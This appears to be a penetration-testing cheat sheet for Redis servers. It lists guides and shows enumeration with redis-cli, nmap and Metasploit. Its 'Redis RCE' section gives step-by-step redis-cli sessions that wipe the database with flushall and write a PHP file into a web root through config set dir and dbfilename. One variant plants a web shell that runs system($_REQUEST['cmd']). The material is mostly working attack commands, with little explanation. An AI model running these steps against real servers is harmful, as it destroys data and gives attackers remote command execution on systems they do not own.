- - -
**<u>Best Guides</u>:**
- [hacktricks.xyz](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis)
- [https://lzone.de/cheat-sheet/Redis](https://lzone.de/cheat-sheet/Redis)
- https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/redis
- - -
### Enumeration : 

```sh
>>> redis-cli -h $IP 
10.10.63.208:6379> info
NOAUTH Authentication required.
10.10.63.208:6379> AUTH <redis_pass>
OK
10.10.63.208:6379> KEYS *
1. internal flag
10.10.63.208:6379> get "internal flag"
<content of the flag>
10.10.63.208:6379> lrange "authlist" 0 100
<Some Data #decoded>
```

```sh
nmap --script redis-info -sV -p 6379 <IP>
```

```sh
msf> use auxiliary/scanner/redis/redis_server
```

- - -
### Redis RCE : 

Useful : https://github.com/iw00tr00t/Redis-Server-Exploit/blob/master/redis.py

```sh
root@bulbul:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> flushall
OK
10.85.0.52:6379> config set dir /usr/share/nginx/html
OK
10.85.0.52:6379> config set dbfilename redis.php
OK
10.85.0.52:6379> set test "<?php phpinfo(); ?>"
OK
10.85.0.52:6379> save
OK
```

Or You can also do : 

```sh
root@bulbul:~# redis-cli -h 10.85.0.52
10.85.0.52:6379> flushall
OK
10.85.0.52:6379> set pwn '<?php system($_REQUEST['cmd']); ?>'
OK
10.85.0.52:6379> config set dbfilename shell.php
OK
10.85.0.52:6379> config set dir /var/www/html
OK
10.85.0.52:6379> save
OK
```
